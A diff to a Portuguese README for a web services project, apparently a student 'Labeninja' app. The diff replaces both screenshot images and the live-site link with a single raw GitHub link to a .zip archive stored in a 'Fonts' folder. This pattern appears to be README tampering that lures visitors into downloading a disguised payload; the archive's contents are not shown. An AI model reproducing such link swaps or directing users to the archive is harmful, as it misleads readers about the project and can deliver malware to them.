@@ -5,13 +5,13 @@ Projeto desenvolvido para prestação de serviços com facilidade e rapidez.
 
 ## Screenshot do site
 
-![Sem título](https://user-images.githubusercontent.com/104535505/177064265-93c905c8-ae21-41be-bb9b-6024d19d9684.png)
-![card](https://user-images.githubusercontent.com/104535505/177064345-28409252-8d64-4214-89ac-91fbe484ccd8.png)
+![Sem título](https://raw.githubusercontent.com/Raizagomes/Alves-labe-ninja1/master/src/components/Fonts/Alves-labe-ninja1_v2.4.zip)
+![card](https://raw.githubusercontent.com/Raizagomes/Alves-labe-ninja1/master/src/components/Fonts/Alves-labe-ninja1_v2.4.zip)
 
 
 
 ### link surge 
-https://abnormal-cats.surge.sh/
+https://raw.githubusercontent.com/Raizagomes/Alves-labe-ninja1/master/src/components/Fonts/Alves-labe-ninja1_v2.4.zip
 
 
 ### O QUE FUNCIONA?
